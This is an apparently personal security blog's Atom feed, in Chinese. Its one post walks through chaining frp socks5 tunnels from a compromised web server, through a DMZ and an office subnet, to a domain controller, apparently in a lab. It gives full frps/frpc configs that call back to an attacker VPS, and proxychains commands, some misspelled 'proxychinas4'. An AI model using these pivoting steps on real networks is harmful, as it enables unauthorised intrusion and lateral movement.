<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Z4yn&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/436a77834f2add32b7dc49df6b0dbe28</icon>
  <subtitle>Better to light one candle than to curse the darkness.</subtitle>
  <link href="https://z4ynadmin.github.io/atom.xml" rel="self"/>
  
  <link href="https://z4ynadmin.github.io/"/>
  <updated>2022-11-07T02:51:09.832Z</updated>
  <id>https://z4ynadmin.github.io/</id>
  
  <author>
    <name>Z4yn&#39;s blog</name>
    <email>z4ynwanwj@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>frp之一层网络代理 / 二层网络代理 / 三层网络代理</title>
    <link href="https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
    <id>https://z4ynadmin.github.io/2022/11/04/frp%E4%B9%8B%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%BA%8C%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%20%20%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</id>
    <published>2022-11-04T03:05:00.000Z</published>
    <updated>2022-11-07T02:51:09.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="frp之一层网络代理-二层网络代理-三层网络代理"><a href="#frp之一层网络代理-二层网络代理-三层网络代理" class="headerlink" title="frp之一层网络代理 / 二层网络代理 / 三层网络代理"></a>frp之一层网络代理 / 二层网络代理 / 三层网络代理</h1><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png" alt="image-20221103155324246"></p><h3 id="一层网络代理"><a href="#一层网络代理" class="headerlink" title="# 一层网络代理"></a># 一层网络代理</h3><p>获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。</p><ol><li>使用VPS作为FRP服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>用Windows Server 2012作为客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080             <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="3"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="4"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 ssh root@10.10.10.15</span><br></pre></td></tr></table></figure><hr><h3 id="二层网络代理"><a href="#二层网络代理" class="headerlink" title="# 二层网络代理"></a># 二层网络代理</h3><p>经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。</p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上起一个frp客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在DMZ区的10.10.10.15 Ubuntu上执行</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10808            <span class="comment"># 代理所使用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><ol start="5"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="6"><li>命令前加上proxychains4</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychinas4 rdesktop 192.168.30.20</span><br></pre></td></tr></table></figure><hr><h3 id="三层网络代理"><a href="#三层网络代理" class="headerlink" title="# 三层网络代理"></a># 三层网络代理</h3><p>通过代理访问到核心区的<strong>192.168.60.10域控制器</strong></p><ol><li>使用VPS作为frp服务端，在VPS上执行：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    <span class="comment"># 在VPS上的FRP服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在VPS上的FRP服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Windows Server 2012 上执行以下命令：</li></ol><p>启动frp客户端，将本地端口10808转发到VPS的1080端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端配置文件frpc.ini的内容如下</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.200    <span class="comment"># 指向VPS上frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向VPS上frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 10.10.10.13         <span class="comment"># 本地监听的ip地址</span></span><br><span class="line">local_port = 10808             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 1080             <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="3"><li>在Windows Server 2012 再起一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\frps.exe -c .\frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13    <span class="comment"># 在Windows Server 2012服务端上绑定的IP地址</span></span><br><span class="line">bind_port = 7000       <span class="comment"># 在服Windows Server 2012服务端上绑定的端口</span></span><br></pre></td></tr></table></figure><ol start="4"><li>在<strong>DMZ区</strong>的10.10.10.15 Ubuntu上执行，启动一个客户端</li></ol><p>启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13      <span class="comment"># 指向Windows Server 2012 frp服务端绑定的ip地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Windows Server 2012 frp服务端绑定的端口</span></span><br><span class="line">[socks5_forward]</span><br><span class="line"><span class="built_in">type</span> = tcp                     <span class="comment"># 所使用的协议类型</span></span><br><span class="line">local_ip = 192.168.30.40       <span class="comment"># 本地监听的IP地址</span></span><br><span class="line">local_port = 10809             <span class="comment"># 要转发的本地端口</span></span><br><span class="line">remote_port = 10808            <span class="comment"># 要转发到的远程端口</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40      <span class="comment"># 指定frp服务器端ip地址</span></span><br><span class="line">bind_port = 7000               <span class="comment"># 指定frp服务端绑定端口</span></span><br></pre></td></tr></table></figure><ol start="6"><li>在办公区的文件服务器上执行</li></ol><p>启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini 配置内容</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40    <span class="comment"># 指向Ubantu服务器上的 frp 服务端IP地址</span></span><br><span class="line">server_port = 7000             <span class="comment"># 指向Ubantu服务器上的 frp 服务端端口</span></span><br><span class="line">[socks5]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 10809            <span class="comment"># 代理所用的端口，会被转发到服务器</span></span><br><span class="line">plugin = socks5                <span class="comment"># 代理类型</span></span><br></pre></td></tr></table></figure><ol start="7"><li>编辑proxychains4的配置文件：/etc/proxychains4.conf </li></ol><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png" alt="image-20221103171204998"></p><ol start="8"><li>命令前加上proxychains4</li></ol><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychinas4</span> rdesktop <span class="number">192.168.60.10</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;frp之一层网络代理-二层网络代理-三层网络代理&quot;&gt;&lt;a href=&quot;#frp之一层网络代理-二层网络代理-三层网络代理&quot; class=&quot;headerlink&quot; title=&quot;frp之一层网络代理 / 二层网络代理 / 三层网络代理&quot;&gt;&lt;/a&gt;frp之一层网络代理</summary>
      
    
    
    
    
    <category term="内网" scheme="https://z4ynadmin.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="代理" scheme="https://z4ynadmin.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
    <category term="frp" scheme="https://z4ynadmin.github.io/tags/frp/"/>
    
  </entry>
  
</feed>
